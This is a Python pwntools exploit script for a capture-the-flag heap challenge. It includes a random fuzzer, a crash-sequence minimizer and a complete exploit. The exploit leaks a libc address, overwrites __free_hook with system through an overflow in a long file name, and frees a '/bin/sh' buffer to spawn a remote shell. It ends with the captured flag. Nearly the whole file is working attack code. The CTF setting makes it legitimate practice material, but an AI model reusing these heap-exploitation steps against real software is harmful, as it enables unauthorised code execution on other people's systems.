#!/usr/bin/env python3
import uuid

from pwn import *

PROMPT = "> \n"


def prompt(tube, n):
    tube.sendlineafter(PROMPT, str(n))


def create_file(tube, file_name, index, buf_size):
    prompt(tube, 1)
    tube.sendlineafter("File Name: \n", file_name)
    tube.sendlineafter("Index: \n", str(index))
    buf_size_prompt = b"Buf Size: \n"
    if not tube.recvuntil((buf_size_prompt, b"Bad Input\n", b"Not empty\n")).endswith(
        buf_size_prompt
    ):
        return
    tube.sendline(str(buf_size))


def open_file(tube, file_name, index, buf_size):
    prompt(tube, 2)
    tube.sendlineafter("File Name: \n", file_name)
    tube.sendlineafter("Index: \n", str(index))
    buf_size_prompt = b"Buf Size: \n"
    if not tube.recvuntil((buf_size_prompt, b"Bad Input\n", b"Not empty\n")).endswith(
        buf_size_prompt
    ):
        return
    tube.sendline(str(buf_size))


def read_file(tube, index):
    prompt(tube, 3)
    tube.sendlineafter("Index: \n", str(index))


def write_file(tube, index, data):
    prompt(tube, 4)
    tube.sendlineafter("Index:\n", str(index))
    bad_input = b"Bad Input\n"
    if tube.recvuntil((b"Input:\n", bad_input)).endswith(bad_input):
        return
    tube.send(data)
    tube.sendlineafter("Read More (Y/y for yes)\n", "n")


def close_file(tube, index):
    prompt(tube, 5)
    tube.sendlineafter("Index: \n", str(index))


def copy_file(tube, src_path, dst_path):
    prompt(tube, 6)
    tube.sendlineafter("Enter filename1: \n", src_path)
    tube.sendlineafter("Enter filename2: \n", dst_path)


def _exit(tube):
    prompt(tube, 7)


def connect():
    if args.LOCAL:
        return gdb.debug(["./chall"], api=True)
    else:
        return remote("cobol.pwni.ng", 3083)


def leak_libc(tube):
    create_file(tube, "/tmp/foo", 1, 0x800)
    write_file(tube, 1, b"X")
    create_file(tube, "/tmp/bar", 2, 0x800)
    close_file(tube, 1)
    open_file(tube, "/tmp/foo", 1, 0x800)
    read_file(tube, 1)
    leak = tube.recvn(0x800)
    libc = struct.unpack("<Q", leak[:8])[0] - 0x3EBC58
    print(f"libc = 0x{libc:x}")
    assert libc & 0xFFF == 0
    close_file(tube, 1)
    close_file(tube, 2)
    return libc


def fuzz_1(tube):
    paths = ["/home/opencbl/chall", "/flag.txt", "/freader"]

    def choose_path():
        if randint(0, 99) < 10:
            paths.append(f"/tmp/{uuid.uuid4()}")
            return paths[-1]
        return paths[randint(0, len(paths) - 1)]

    def choose_index():
        return randint(-1, 17)

    def choose_buf_size():
        return randint(-1, 8192)

    while True:
        choice = randint(0, 999)
        if choice < 100:
            path = choose_path()
            index = choose_index()
            buf_size = choose_buf_size()
            print(f"create_file(tube, {repr(path)}, {repr(index)}, {repr(buf_size)})")
            create_file(tube, path, index, buf_size)
        elif choice < 200:
            path = choose_path()
            index = choose_index()
            buf_size = choose_buf_size()
            print(f"open_file(tube, {repr(path)}, {repr(index)}, {repr(buf_size)})")
            open_file(tube, choose_path(), choose_index(), choose_buf_size())
        elif choice < 500:
            index = choose_index()
            print(f"read_file(tube, {repr(index)})")
            read_file(tube, index)
        elif choice < 800:
            index = choose_index()
            count = randint(1, 8192)
            print(f'write_file(tube, {repr(index)}, "A" * {repr(count)})')
            write_file(tube, index, "A" * count)
        elif choice < 850:
            index = choose_index()
            print(f"close_file(tube, {repr(index)})")
            close_file(tube, index)
        elif choice < 999:
            path1 = choose_path()
            path2 = choose_path()
            print(f"copy_file(tube, {repr(path1)}, {repr(path2)})")
            copy_file(tube, path1, path2)
        else:
            _exit(tube)
            print(f"_exit(tube)")
            break


def fuzz():
    i = 0
    while True:
        i += 1
        print(f"--- run {i} ---")
        with connect() as tube:
            if args.LOCAL:
                tube.gdb.continue_nowait()
            fuzz_1(tube)


ACTIONS = [
    lambda tube: copy_file(
        tube, "/home/opencbl/chall", "/tmp/cobolfzz-60a6-4351-81ef-781f97d04c55"
    ),
    lambda tube: create_file(
        tube, "/tmp/cobolfzz-60a6-4351-81ef-781f97d04c55", 10, 5383
    ),
    lambda tube: copy_file(
        tube, "/tmp/cobolfzz-58fc-4934-805c-0f14e5b1bf90", "/flag.txt"
    ),
    lambda tube: write_file(tube, 12, "A" * 5985),
    lambda tube: copy_file(
        tube,
        "/tmp/cobolfzz-58fc-4934-805c-0f14e5b1bf90",
        "/tmp/cobolfzz-58fc-4934-805c-0f14e5b1bf90",
    ),
    lambda tube: copy_file(
        tube,
        "/tmp/cobolfzz-5d9d-4918-a79b-e51118c60f86",
        "/tmp/cobolfzz-60a6-4351-81ef-781f97d04c55",
    ),
    lambda tube: open_file(tube, "/tmp/cobolfzz-7bc7-42c3-aad9-989272f27b7b", 2, 266),
    lambda tube: close_file(tube, 11),
    lambda tube: create_file(
        tube, "/tmp/cobolfzz-7bc7-42c3-aad9-989272f27b7b", 12, 2989
    ),
    lambda tube: copy_file(
        tube,
        "/tmp/cobolfzz-60a6-4351-81ef-781f97d04c55",
        "/tmp/cobolfzz-58fc-4934-805c-0f14e5b1bf90",
    ),
    lambda tube: close_file(tube, 14),
]


def reproduce(actions):
    try:
        os.system("rm /tmp/cobolfzz-*")
        with process(["./chall"]) as tube:
            for action in actions:
                action(tube)
            tube.recvuntil(PROMPT)
    except EOFError:
        return True


def minimize():
    assert reproduce(ACTIONS)
    indices = list(range(len(ACTIONS)))
    ok_count = 0
    while ok_count < 100:
        drop = randint(0, len(indices) - 1)
        indices_1 = indices[:drop] + indices[drop + 1 :]
        for _ in range(3):
            if not reproduce([ACTIONS[i] for i in indices_1]):
                ok_count += 1
                break
        else:
            indices = indices_1
            ok_count = 0
    assert reproduce([ACTIONS[i] for i in indices])
    print(indices)


def main():
    # fuzz(); return
    # minimize(); return
    # reproduce(ACTIONS); return
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.continue_nowait()
        libc = leak_libc(tube)
        free_hook = libc + 0x3ed8e8
        system = libc + 0x4f550

        create_file(tube, "/tmp/x", 1, 8)
        write_file(tube, 1, struct.pack("<Q", system))
        close_file(tube, 1)

        create_file(tube, "/tmp/y", 1, 8)
        write_file(tube, 1, b"/bin/sh\0")
        close_file(tube, 1)

        path = "/tmp/".ljust(0xFF, "A")
        create_file(tube, path, 1, 0x100)
        write_file(tube, 1, struct.pack("<Q", free_hook))
        close_file(tube, 1)

        copy_file(tube, path, "/tmp/".ljust(0xFF, "B"))

        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            print(tube.gdb.execute("heap bins", to_string=True))
            tube.gdb.continue_nowait()

        create_file(tube, "/tmp/x0", 1, 0x100)
        create_file(tube, "/tmp/x1", 2, 0x100)
        create_file(tube, "/tmp/x2", 3, 0x100)

        if args.LOCAL:
            tube.recvuntil(PROMPT)
            tube.unrecv(PROMPT)
            tube.gdb.interrupt_and_wait()
            print(tube.gdb.execute("heap bins", to_string=True))
            tube.gdb.continue_nowait()

        open_file(tube, "/tmp/x", 4, 0x100)
        read_file(tube, 4)
        close_file(tube, 4)

        open_file(tube, "/tmp/y", 4, 8)
        read_file(tube, 4)
        close_file(tube, 4)

        tube.interactive()
        # PCTF{l3arning_n3w_languag3_sh0uld_start_with_g00d_bugs_99d4ec917d097f63107e}


if __name__ == "__main__":
    main()
